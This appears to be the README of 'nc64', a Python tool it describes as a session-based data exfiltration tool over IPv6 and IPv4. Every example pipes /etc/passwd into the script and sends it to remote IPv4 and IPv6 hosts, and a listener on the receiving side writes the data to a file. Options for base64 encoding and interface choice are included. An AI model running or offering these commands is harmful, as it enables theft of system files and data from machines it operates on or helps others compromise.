# nc64
IPv6 and IPv4 session based data exfiltration tool

# Examples:
cat /etc/passwd | python3 nc64.py -h4 192.168.10.10 -h6 2a02:1010:12aa::11
python3 nc64.py -l > out

cat /etc/passwd | python3 nc64.py -i wlan0 -p 4444 -h4 192.168.10.10 -h6 2a02:1010:12aa::11
python3 nc64.py -l -i eth1 -p 4444 > out

cat /etc/passwd | python3 nc64.py -h4 192.168.10.10 -h6 2a02:1010:12aa::11 -b64 -T
python3 nc64.py -l -b64 > out
